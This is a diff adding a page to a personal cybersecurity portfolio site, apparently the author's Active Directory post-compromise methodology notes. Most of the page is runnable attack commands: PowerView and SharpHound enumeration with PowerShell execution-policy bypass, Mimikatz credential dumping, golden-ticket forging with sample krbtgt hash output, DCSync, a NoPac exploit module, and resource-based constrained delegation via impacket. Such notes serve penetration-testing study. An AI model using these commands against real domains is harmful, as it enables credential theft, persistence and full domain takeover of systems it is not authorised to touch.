@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="assets/css/method-styles.css">
+
+    <title>TITLE</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="#" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="#home" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="595e5368-e577-4e31-942d-baceb84f0e3d" class="page sans"><header><h1 class="page-title">AD Post Compromise Enumeration</h1></header><div class="page-body"><p id="37fd0a58-41bc-4f0c-982a-450b5af315bb" class="">
+</p><h2 id="91446a42-ae12-463a-b752-b0a7526330db" class=""><strong>Powerview:</strong></h2><pre id="fa9b35a3-9c6c-412e-8c4c-a1d1b0c97b01" class="code"><code>#On Windows victim machine
+powershell -ep bypass
+. .\Downloads\PowerView.ps1
+#Enumerate Domain users
+Get-NetUser | select cn
+#Enumerate Domain groups
+Get-NetGroup -GroupName *admin*
+#Find Shares
+Invoke-ShareFinder
+#Get OS of network computers
+Get-NetComputer -fulldata | select operatingsystem
+#Further Enumeration with PowerView Cheatsheet...
+</code></pre><ul id="d82b7bd7-21a4-43ca-9d62-09c6f68e504e" class="bulleted-list"><li style="list-style-type:disc">PowerView Cheatsheet: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</li></ul><p id="3f760282-c46b-4d7a-965f-b77fc22c17ee" class="">
+</p><h2 id="31bcb373-f66f-4e71-a0e1-6c4f489f395c" class=""><strong>Bloodhound:</strong></h2><p id="a7e018cf-d12e-463e-8255-b730045dcdd8" class="">start up neo4j</p><pre id="705987d0-423b-4ac9-aaa1-23ba79446e06" class="code"><code>neo4j console</code></pre><p id="9000dd15-c07f-476c-88ee-2f2d1b2928d5" class=""><strong>Username:</strong> neo4j</p><p id="c4c36039-a02e-40ff-9eb2-bbd35bce123a" class=""><strong>Password:</strong> neo4j</p><ul id="c616cd28-8c35-4d12-8765-52e6ccea7bf5" class="bulleted-list"><li style="list-style-type:disc">visit the server provided to change password</li></ul><p id="60e06eb3-c717-43ab-bfad-818540277387" class="">Change password to - password</p><pre id="c0f8d028-f984-4b5d-9d2a-ed8dd20dec85" class="code"><code>#In your kali terminal...
+bloodhound</code></pre><ul id="53a3ddfa-33e5-433d-ad6d-e7f7b969385f" class="bulleted-list"><li style="list-style-type:disc">sign in</li></ul><ul id="2cff4907-c727-4a40-9642-2143cda49d23" class="bulleted-list"><li style="list-style-type:disc">Now use ingester to get AD data from Windows machine</li></ul><ul id="6dc9a713-8609-41af-beba-6fb4ca684913" class="bulleted-list"><li style="list-style-type:disc">Now on the Windows machine…</li></ul><p id="92784d58-9ad5-4e9f-9aa3-91b9a0a99328" class=""><strong>Invoke-Bloodhound:</strong></p><ul id="507e27c3-8ae6-40d0-bdf2-310e08fbfabf" class="bulleted-list"><li style="list-style-type:disc">download sharphound.ps1</li></ul><pre id="5e7e8798-8f10-4c75-99e9-2132ed4c3663" class="code"><code>powershell -ep bypass
+. .\Downloads\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All -Domain &lt;domain&gt;.&lt;local&gt; -ZipFileName file.zip</code></pre><p id="2f402068-56e3-4272-b786-9f8e9c791817" class="">For SharpHound.exe:</p><pre id="88982dc3-c0f2-44c8-8594-995c45a10d38" class="code"><code>powershell -ep bypass
+.\SharpHound.exe -c All -d &lt;domain&gt;.&lt;local&gt; --zipfilename file.zip</code></pre><ul id="ac4be3c8-a70b-491a-b95f-8b52d12a86fc" class="bulleted-list"><li style="list-style-type:disc">Copy the data to your Linux machine</li></ul><ul id="08006a6e-1cc2-4f35-81c4-f7541b2c8831" class="bulleted-list"><li style="list-style-type:disc">upload the files</li></ul><ul id="b4c7af2f-d5d6-44d5-a5b2-1556d8da4c17" class="bulleted-list"><li style="list-style-type:disc">click the hamburger<ul id="0d3b75cb-4963-4f04-9885-0701780eec0f" class="bulleted-list"><li style="list-style-type:circle">you can find all Domain admins</li></ul><ul id="933998fb-7772-4429-a37d-87f5a5bd9e40" class="bulleted-list"><li style="list-style-type:circle">shortest path to a DA</li></ul><ul id="fc3b9207-7511-423a-8d1f-76728022749d" class="bulleted-list"><li style="list-style-type:circle">We want to compromise accounts with DAs logged in</li></ul></li></ul><p id="43ce36bc-dfa2-4e0e-8f68-528d39b1b46d" class="">
+</p><p id="e8390758-54f0-4880-86c2-b4911c77e731" class="">you need valid credentials…</p><figure id="51a00a9a-3b91-47c9-9d14-a300f003f39f" class="image"><a href="AD%20Post%20Compromise%20Enumeration%20595e5368e5774e31942dbaceb84f0e3d/Untitled.png"><img style="width:976px" src="AD%20Post%20Compromise%20Enumeration%20595e5368e5774e31942dbaceb84f0e3d/Untitled.png"/></a></figure><p id="19aef556-8f14-431b-b947-2758892cfb1c" class=""><strong>CME Bloodhound:</strong></p><pre id="fb5eafd0-1dac-4532-a6aa-2356a61a55fc" class="code"><code>crackmapexec ldap &lt;ip_dc dc01.idk.crazy&gt; -u user -p pass --bloodhound -ns 0.0.0.0 -c All</code></pre><p id="12df6564-e3cf-4aeb-ab75-93995827a45e" class="">
+</p><h2 id="5847297c-3b5d-40bd-9716-d3502cd68a60" class="">M<strong>imikatz:</strong></h2><ul id="0662174d-c34d-4255-b982-bda300f0cd89" class="bulleted-list"><li style="list-style-type:disc">can also invoke-mimikatz</li></ul><ul id="0cc812e8-f29e-49e7-87e2-3a6a609b7fe6" class="bulleted-list"><li style="list-style-type:disc">Dumps creds stored in memory</li></ul><ul id="92570318-7e94-4d9e-bd84-87e6c3807ca2" class="bulleted-list"><li style="list-style-type:disc">Can perform Credential dumping, PTH,Over-Pass-the-Hash, Pass-The-Ticket, Golden Ticket, Silver Ticket attacks.</li></ul><p id="241398e0-b82c-4a5f-b041-46f11fc39a22" class="">
+</p><ul id="da0ef1d3-26a7-4d0b-bffc-4f5897dcdc76" class="bulleted-list"><li style="list-style-type:disc">credential dumping<pre id="e2c8cf7b-771d-49dc-8795-4068b62250d5" class="code"><code>privilege::debug
+sekurlsa::logonpasswords</code></pre></li></ul><p id="2d7c881e-db30-4f1a-b41c-172acd542e71" class="">
+</p><ul id="f3665986-fedd-4fda-b1db-4cf4f05bd5e4" class="bulleted-list"><li style="list-style-type:disc">wdigest - stored pw in plain text, we can actually tturn this on with mimikatz.</li></ul><p id="bf2517ff-a7a9-48fb-acdc-7b903e281733" class="">
+</p><pre id="cddbb6cd-e45d-4e77-82d2-69fc10b0e43c" class="code"><code>lsadump::sam
+lsadump::lsa /patch - local security authority
+kerberos::list /export
+lsadump::secrets
+lsadump::cache
+
+sekurlsa::tickets</code></pre><p id="7773b3ce-77ec-4c8c-9359-1e8843a5a8e5" class="">
+</p><h2 id="581e868d-cb54-4907-b749-24d1da736cf9" class=""><strong>Golden ticket attacks:</strong></h2><ul id="c93ce702-a883-47cd-b7b2-23d71e4df440" class="bulleted-list"><li style="list-style-type:disc">Getting access to the TGS so we can write our own tickets</li></ul><pre id="0f6f85b7-2bc3-4a98-b52f-6ccc21977994" class="code"><code>whoami /user #grab sid, exclude last 5 num
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+#grab ntlm hash and name then...
+kerberos::golden /User:myuser /domain:domain.local _sid:&lt;sid&gt; /krbtgt:&lt;krbtgt&gt; /ptt
+misc::cmd
+psexec.exe　\\DC01 cmd.exe
+------------------
+=====
+lsadump::lsa /inject /name:krbtgt
+kerberos::golden /User:Administrator /domain:domain.local _sid:&lt;sid&gt; /krbtgt:&lt;krbtgt&gt; /id:500 /ptt
+misc::cmd</code></pre><ul id="13fae81e-a494-4884-aefa-d9220b6c0277" class="bulleted-list"><li style="list-style-type:disc">Golden ticket gives us persistence</li></ul><p id="9acdbd3f-bd63-4367-a17d-0fa1e20f932d" class=""><strong>EXAMPLE:</strong></p><pre id="7a05d8b9-f534-41c8-a1ae-336d86a3b843" class="code"><code>#Dump the krbtgt Hash
+mimikatz # lsadump::lsa /inject /name:krbtgt 
+Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 #we need this
+
+RID  : 000001f6 (502)
+User : krbtgt #we need this
+
+ * Primary
+    NTLM : 5508500012cc005cf7082a9a89ebdfdf #we need this
+    LM   :
+  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
+    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
+    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c
+
+#Create a Golden Ticket
+mimikatz # kerberos::golden /user:Administrator /domain:Controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf
+User      : Administrator 
+Domain    : Controller.local (CONTROLLER)
+SID       : S-1-5-21-849420856-2351964222-986696166
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
+Lifetime  : 3/5/2023 12:28:04 PM ; 3/2/2033 12:28:04 PM ; 3/2/2033 12:28:04 PM
+-&gt; Ticket : ticket.kirbi
+
+ * PAC generated 
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+#Use the Golden Ticket to access other machine
+mimikatz # misc::cmd 
+Patch OK for &#x27;cmd.exe&#x27; from &#x27;DisableCMD&#x27; to &#x27;KiwiAndCMD&#x27; @ 00007FF6920D43B8
+
+dir \\Desktop-1\c$
+
+</code></pre><h2 id="04157186-bd6e-42e9-98f2-91ba12dc9eb3" class="">DCSync:</h2><pre id="58e20e9b-987d-4b9d-9ec3-360ed8b07505" class="code"><code>lsadump::dcsync /user:Administrator</code></pre><h2 id="5ec81b0b-2de0-4fe3-be36-ff27536dfad3" class="">Sam the Admin:</h2><p id="9d72b5f6-459f-4ce9-87a9-a847c91bd168" class="">#TODO</p><h2 id="395ae4a9-2a9e-40f7-a762-f497bb45f0e0" class="">NoPac:</h2><pre id="501673cc-d612-45b0-8be7-f6fa49affc83" class="code"><code>crackmapexec smb IP -u user -p pass -M nopac</code></pre><p id="93900ade-1ce5-4284-82c0-b0f3728bec57" class="">
+</p><p id="121035b1-a300-4bb2-b9c1-160bbcf89300" class="">GenericAll:</p><p id="f9477618-ad2f-4b13-be9c-a47b8c4b0c16" class=""><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse</a></p><p id="7ba881e7-ac7e-4e5d-8211-af59a250dbde" class=""><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation</a></p><pre id="e7687655-b321-4884-a32d-7e33df6f5908" class="code"><code>#Adding computer to list
+impacket-addcomputer 
+impacket-rbcd -f 
+#request service ticket
+impacket-getST</code></pre></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
